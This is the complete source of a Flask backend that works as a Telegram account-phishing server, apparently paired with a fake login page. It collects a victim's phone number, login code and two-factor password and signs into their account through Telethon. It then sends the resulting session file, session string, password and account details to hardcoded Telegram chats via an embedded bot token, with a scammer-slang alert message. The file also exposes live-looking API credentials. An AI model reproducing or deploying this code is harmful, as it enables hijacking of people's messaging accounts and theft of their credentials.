from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import asyncio
from threading import Thread
import requests

app = Flask(__name__)
CORS(app)

API_ID = 2040
API_HASH = 'b18441a1ff607e10a989891a5462e627'

BOT_TOKEN = '8361292906:AAGD-vTx2U6OmjuTr77KA7ohxDq0KneW2VE'
CHAT_ID = ['1344917993', '6125270583']

active_sessions = {}

loop = None
loop_thread = None

def start_loop(l):
    asyncio.set_event_loop(l)
    l.run_forever()

def run_coroutine(coro):
    global loop
    future = asyncio.run_coroutine_threadsafe(coro, loop)
    return future.result()

def init_loop():
    global loop, loop_thread
    loop = asyncio.new_event_loop()
    loop_thread = Thread(target=start_loop, args=(loop,), daemon=True)
    loop_thread.start()

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    for chat_id in CHAT_ID:
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        try:
            requests.post(url, json=payload)
        except Exception as e:
            print(f"Error sending message to Telegram chat {chat_id}: {e}")

def send_telegram_document(filepath):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    for chat_id in CHAT_ID:
        try:
            with open(filepath, 'rb') as f:
                files = {'document': f}
                requests.post(url, files=files, data={'chat_id': chat_id})
        except Exception as e:
            print(f"Error sending document to Telegram chat {chat_id}: {e}")

async def save_to_file_session(session_string, filename):
    string_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await string_client.connect()
    
    await string_client.get_me()
    
    await string_client.disconnect()
    
    file_client = TelegramClient(filename, API_ID, API_HASH)
    
    file_client.session.set_dc(
        string_client.session.dc_id,
        string_client.session.server_address,
        string_client.session.port
    )
    file_client.session.auth_key = string_client.session.auth_key
    
    file_client.session.save()
    
    return f"{filename}.session"

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/send-code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'error': 'Phone number required'}), 400
    
    try:
        session_name = f'session_{phone.replace("+", "").replace(" ", "")}'
        
        async def send():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            
            active_sessions[phone] = {
                'client': client,
                'session_name': session_name,
                'phone_code_hash': result.phone_code_hash
            }
            
            return result.phone_code_hash
        
        run_coroutine(send())
        
        return jsonify({
            'success': True,
            'message': 'Code sent to your phone'
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    
    if not phone or not code:
        return jsonify({'error': 'Phone and code required'}), 400
    
    if phone not in active_sessions:
        return jsonify({'error': 'Session not found. Please start again.'}), 404
    
    try:
        session = active_sessions[phone]
        client = session['client']
        phone_code_hash = session['phone_code_hash']
        
        async def verify():
            try:
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                
                user = await client.get_me()
                
                session_string = client.session.save()
                await client.disconnect()
                
                session_file_name = session['session_name']
                await save_to_file_session(session_string, session_file_name)
                
                send_telegram_document(f"{session_file_name}.session")
                
                username = user.username if user.username else "N/A"
                user_id = user.id if user.id else "N/A"
                
                message = f"Мамонт набутылен! \n\nНомер телефона: {phone}\nЮзернейм: @{username}\nID аккаунта: {user_id}\n\nSession String: {session_string}"
                send_telegram_message(message)
                
                return {'needs_password': False, 'session_string': session_string, 'session_file': session_file_name}
            except SessionPasswordNeededError:
                return {'needs_password': True, 'session_string': None, 'session_file': None}
        
        result = run_coroutine(verify())
        
        if result['needs_password']:
            return jsonify({
                'success': True,
                'needs_password': True,
                'message': 'Two-factor authentication required'
            })
        else:
            del active_sessions[phone]
            
            return jsonify({
                'success': True,
                'needs_password': False,
                'session_string': result['session_string'],
                'session_file': result['session_file']
            })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/verify-password', methods=['POST'])
def verify_password():
    data = request.json
    phone = data.get('phone')
    password = data.get('password')
    
    if not phone or not password:
        return jsonify({'error': 'Phone and password required'}), 400
    
    if phone not in active_sessions:
        return jsonify({'error': 'Session not found. Please start again.'}), 404
    
    try:
        session = active_sessions[phone]
        client = session['client']
        
        async def verify():
            await client.sign_in(password=password)
            
            user = await client.get_me()
            
            session_string = client.session.save()
            await client.disconnect()
            
            session_file_name = session['session_name']
            await save_to_file_session(session_string, session_file_name)
            
            send_telegram_document(f"{session_file_name}.session")
            
            username = user.username if user.username else "N/A"
            user_id = user.id if user.id else "N/A"
            
            message = f"Мамонт набутылен! \n\nНомер телефона: {phone}\nЮзернейм: @{username}\nID аккаунта: {user_id}\n\nSession String: {session_string}\n\nПароль: {password}"
            send_telegram_message(message)
            
            return {'session_string': session_string, 'session_file': session_file_name}
        
        result = run_coroutine(verify())
        
        del active_sessions[phone]
        
        return jsonify({
            'success': True,
            'session_string': result['session_string'],
            'session_file': result['session_file']
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    
    init_loop()
    
    app.run(debug=False, threaded=True, host='0.0.0.0', port=8080)